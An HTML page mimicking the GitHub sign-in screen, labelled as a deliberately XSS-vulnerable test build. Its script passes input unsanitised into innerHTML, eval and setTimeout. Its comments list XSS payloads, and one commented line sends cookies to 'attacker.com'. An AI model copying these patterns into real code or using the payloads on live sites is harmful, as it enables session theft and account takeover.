<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GitHub login ¬∑ XSS testing</title>
  <!-- Tailwind via CDN (v3) -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Inter font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; }
    .focus-ring:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(9, 105, 218, 0.3);
      border-color: #0969da;
    }
    .xss-output {
      word-break: break-all;
    }
  </style>
</head>
<body class="bg-[#f6f8fa] min-h-screen flex flex-col items-center justify-start px-6 pt-12 pb-20">

  

  <!-- GitHub logo -->
  <div class="mb-6">
    <svg height="48" viewBox="0 0 24 24" width="48" class="fill-[#1f2328]">
      <path d="M12.5.75C6.146.75.75 6.146.75 12.5c0 5.063 3.29 9.36 7.84 10.86.575.106.79-.25.79-.553 0-.276-.01-1.2-.015-2.18-3.188.693-3.86-1.537-3.86-1.537-.52-1.326-1.27-1.68-1.27-1.68-1.04-.712.08-.697.08-.697 1.15.082 1.755 1.182 1.755 1.182 1.02 1.753 2.68 1.247 3.335.954.104-.74.4-1.247.727-1.534-2.55-.29-5.23-1.275-5.23-5.673 0-1.254.45-2.28 1.184-3.084-.12-.29-.514-1.46.112-3.04 0 0 .965-.31 3.162 1.18.92-.256 1.906-.384 2.885-.39.98.006 1.966.134 2.887.39 2.196-1.49 3.16-1.18 3.16-1.18.627 1.58.233 2.75.113 3.04.735.804 1.184 1.83 1.184 3.084 0 4.41-2.685 5.38-5.24 5.66.412.357.78 1.06.78 2.137 0 1.545-.015 2.79-.015 3.17 0 .306.213.664.8.55 4.547-1.503 7.833-5.8 7.833-10.86 0-6.354-5.396-11.75-11.75-11.75Z"></path>
    </svg>
  </div>

  <!-- MAIN LOGIN CARD - VULNERABLE TO XSS -->
  <div class="w-full max-w-[340px] bg-white rounded-md border border-[#d0d7de] p-4 sm:p-5 md:p-6 shadow-[0_4px_12px_rgba(0,0,0,0.15)]">
    
    <h1 class="text-[24px] leading-[1.4] font-light text-[#1f2328] mb-4 text-center">Sign in to GitHub</h1>

    <!-- VULNERABLE FORM #1: Direct DOM injection with innerHTML -->
    <form id="xssForm" action="javascript:void(0)" method="post" class="space-y-4" onsubmit="vulnLogin()">
      
      <!-- XSS VECTOR 1: username field - injects via innerHTML -->
      <div>
        <label for="login_field" class="block text-[14px] font-medium text-[#1f2328] mb-1.5">
          Username or email address
        </label>
        <input type="text" id="login_field" name="login" 
               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
               placeholder="Try <img src=x onerror=alert('XSS')>" 
               value="">
        <p class="text-xs text-gray-500 mt-1">Vulnerable to stored/reflected XSS</p>
      </div>

      <!-- XSS VECTOR 2: password field with eval() vulnerability -->
      <div>
        <div class="flex justify-between items-center mb-1.5">
          <label for="password_field" class="text-[14px] font-medium text-[#1f2328]">
            Password
          </label>
          <a href="#" onclick="showForgotMessage()" class="text-[12px] text-[#0969da] no-underline hover:underline">
            Forgot password?
          </a>
        </div>
        <input type="text" id="password_field" name="password" 
               class="block w-full px-3 py-2 border border-[#d0d7de] rounded-md text-[14px] focus-ring"
               placeholder="Password field also vulnerable"
               value="">
      </div>

      <!-- Sign in button triggers XSS -->
      <button type="submit" 
              class="mt-1 w-full py-2 px-3 bg-[#1f883d] text-white text-[14px] font-semibold rounded-md">
        Sign in (XSS enabled)
      </button>
    </form>

    <!-- XSS VECTOR 3: DOM-based XSS via URL hash -->
    <div class="mt-4 text-center border-t border-[#d0d7de] pt-4">
      <button onclick="showHashXSS()" class="text-[14px] text-[#0969da] bg-transparent inline-flex items-center gap-1 hover:underline">
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" width="16" class="fill-current mr-1">
          <path d="M10.5 4.5a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0Z"></path>
          <path d="M8 8a5 5 0 0 0-4.546 2.917.714.714 0 0 0 .062.715A7.484 7.484 0 0 0 8 14c1.56 0 3.008-.477 4.21-1.292.28-.19.357-.558.147-.801A6.47 6.47 0 0 0 8 8Z"></path>
        </svg>
        Show URL hash (XSS via location.hash)
      </button>
    </div>

    <!-- XSS VECTOR 4: Reflected output - dangerously sets HTML -->
    <div id="xssOutput" class="mt-4 p-3 bg-gray-50 border border-gray-200 rounded-md text-xs font-mono xss-output">
      <!-- XSS payload will be injected here via innerHTML -->
      XSS output will appear here
    </div>
  </div>

  <!-- "Create account" - also has XSS vector via onclick -->
  <div class="w-full max-w-[340px] mt-4 p-4 bg-white border border-[#d0d7de] rounded-md text-center text-[14px]">
    <span class="text-[#1f2328]">New to GitHub? </span>
    <a href="#" onclick="createAccountXSS()" class="text-[#0969da] no-underline hover:underline font-medium">
      Create an account
    </a>
    <span class="ml-1 text-xs text-red-600">(XSS vector)</span>
  </div>

  <!-- Footer links - some with javascript: XSS vectors -->
  <div class="flex flex-wrap items-center justify-center gap-x-4 gap-y-1 mt-8 text-[12px]">
    <a href="javascript:alert('Terms XSS')" class="hover:underline text-[#6e7781] no-underline">Terms</a>
    <a href="javascript:alert('Privacy XSS')" class="hover:underline text-[#6e7781] no-underline">Privacy</a>
    <a href="#" onclick="docsXSS()" class="hover:underline text-[#6e7781] no-underline">Docs</a>
    <a href="#" onclick="contactXSS()" class="hover:underline text-[#6e7781] no-underline flex items-center gap-1">
      Contact Support (XSS)
    </a>
  </div>

  <!-- XSS EXPLOITATION DEMONSTRATION -->
  <div class="w-full max-w-[340px] mt-6 p-4 bg-red-50 border border-red-200 rounded-md">
    <h3 class="font-bold text-red-800 text-sm mb-2">üî• XSS PAYLOAD TESTING üî•</h3>
    <div class="grid grid-cols-2 gap-2 text-xs">
      <button onclick="testXSS1()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test alert(1)</button>
      <button onclick="testXSS2()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;img&gt;</button>
      <button onclick="testXSS3()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test &lt;script&gt;</button>
      <button onclick="testXSS4()" class="bg-red-100 p-2 rounded border border-red-300 hover:bg-red-200">Test onerror</button>
    </div>
    <p class="text-xs text-red-700 mt-2">Enter in username field: <code class="bg-red-100 px-1">&lt;img src=x onerror=alert('XSS')&gt;</code></p>
  </div>

  <!-- DELIBERATE XSS VULNERABILITIES - JavaScript with unsafe patterns -->
  <script>
    // ============== INTENTIONAL XSS VULNERABILITIES ==============
    // DO NOT USE THIS CODE IN PRODUCTION - FOR SECURITY TESTING ONLY
    
    // VULNERABILITY 1: innerHTML injection from form input
    function vulnLogin() {
      // Get user input without sanitization
      var username = document.getElementById('login_field').value;
      var password = document.getElementById('password_field').value;
      
      // DANGER: Direct innerHTML injection - XSS vulnerability
      var outputDiv = document.getElementById('xssOutput');
      outputDiv.innerHTML = '<strong>Login attempt:</strong> ' + username + ' / ' + password;
      
      // Also demonstrate eval vulnerability if input contains "eval"
      if (username.includes('eval(') || password.includes('eval(')) {
        try {
          // DANGER: Dynamic eval - severe XSS vector
          eval(username); // NEVER DO THIS
        } catch(e) {
          console.log('Eval attempted');
        }
      }
      
      // Log to console
      console.log('XSS payload executed. User input: ' + username);
      return false;
    }
    
    // VULNERABILITY 2: DOM-based XSS via location.hash
    function showHashXSS() {
      // DANGER: Direct insertion of URL hash without sanitization
      var hash = location.hash.substring(1); // Get everything after #
      if (hash) {
        var outputDiv = document.getElementById('xssOutput');
        // CRITICAL XSS VULNERABILITY
        outputDiv.innerHTML = '<strong>URL Hash:</strong> ' + hash;
      } else {
        alert('Add #&lt;script&gt;alert(1)&lt;/script&gt; to the URL and click again');
      }
    }
    
    // VULNERABILITY 3: javascript: URI XSS
    function showForgotMessage() {
      // DOM-based XSS via href injection
      var msg = prompt('Enter error message (XSS test):', 'Password reset');
      if (msg) {
        // DANGER: Creating anchor with javascript: URI
        var link = document.createElement('a');
        link.href = 'javascript:alert("' + msg + '")'; // XSS via javascript: URI
        link.click();
      }
    }
    
    // VULNERABILITY 4: onclick XSS vector
    function createAccountXSS() {
      // DANGER: Injecting into onclick
      var payload = prompt('Enter payload (test with: alert(document.cookie))', 'alert("XSS")');
      if (payload) {
        // CRITICAL: Dynamic script execution
        setTimeout(payload, 100); // XSS via setTimeout string evaluation
      }
    }
    
    // VULNERABILITY 5: Additional XSS vectors
    function docsXSS() {
      // document.write XSS (classic)
      document.write('<h1>XSS via document.write</h1><script>alert("document.write XSS")<\/script>');
    }
    
    function contactXSS() {
      // innerHTML injection
      var div = document.createElement('div');
      div.innerHTML = 'Support: <img src=x onerror=alert("Contact XSS")>';
      document.body.appendChild(div);
    }
    
    // ============== TEST FUNCTIONS ==============
    function testXSS1() {
      var output = document.getElementById('xssOutput');
      output.innerHTML = '<div onload="alert(1)">XSS test 1</div>';
    }
    
    function testXSS2() {
      var output = document.getElementById('xssOutput');
      output.innerHTML = '<img src="invalid" onerror="alert(\'Image XSS\')">';
    }
    
    function testXSS3() {
      var output = document.getElementById('xssOutput');
      output.innerHTML = '<script>alert("Script XSS")<\/script>';
    }
    
    function testXSS4() {
      var output = document.getElementById('xssOutput');
      output.innerHTML = '<svg/onload=alert("SVG XSS")>';
    }
    
    // Auto-execute from URL hash (DOM-based XSS)
    window.onload = function() {
      // Check for hash payload
      if (location.hash.length > 1) {
        console.log('Hash detected: ' + location.hash);
        // VULNERABLE: Don't do this in production!
        // This is intentionally vulnerable for testing
      }
      
      // Pre-populate with example if empty
      if (!document.getElementById('login_field').value) {
        // Uncomment to auto-fill test payload:
        // document.getElementById('login_field').value = '<img src=x onerror=alert("Auto XSS")>';
      }
    };
    
    // VULNERABILITY 6: Cookie stealing simulation (educational)
    function stealCookies() {
      var cookies = document.cookie;
      alert('[DEMO] Cookies would be sent to attacker: ' + cookies);
      // In real attack: new Image().src = 'https://attacker.com/steal?c=' + cookies;
    }
    
    console.log('XSS testing environment loaded - DO NOT USE IN PRODUCTION');
  </script>
  
  <!-- Additional XSS vector: hidden iframe with javascript: -->
  <iframe src="javascript:false" style="display:none"></iframe>
  
  <!-- Comment with XSS hint: 
    Try these payloads:
    - <script>alert('XSS')</script>
    - <img src=x onerror=alert('XSS')>
    - " onmouseover="alert('XSS')
    - javascript:alert('XSS')
    - <svg onload=alert('XSS')>
    - ');alert('XSS');//
    - <iframe src="javascript:alert('XSS')">
  -->
  
  <div class="text-[11px] text-[#6e7781] mt-6">
    ‚ö†Ô∏è XSS TEST BUILD - Intentionally vulnerable ‚ö†Ô∏è
  </div>
</body>
</html>
